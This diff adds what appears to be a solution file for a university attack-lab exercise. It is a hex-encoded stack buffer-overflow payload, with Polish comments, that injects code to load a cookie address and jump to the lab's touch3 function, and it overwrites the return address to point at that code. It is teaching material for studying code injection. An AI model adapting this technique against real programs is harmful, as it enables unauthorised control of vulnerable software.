@@ -1,0 +1,12 @@
+48 c7 c7 88 55 62 55 /* mov $55625588, %rdi (adres ciasteczka -> rdi) */
+68 9a 1c 40 00 /* push $0x401c9a (adres funkcji touch3) */
+c3 /* ret */
+
+00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* bufor zapełniony śmieciowymi danymi */
+48 55 62 55 00 00 00 00 /* adres powrotu ustawiony na wsztrzyknięte instukcje */
+34 34 34 31 34 62 66 64 00 /* Ciasteczko */
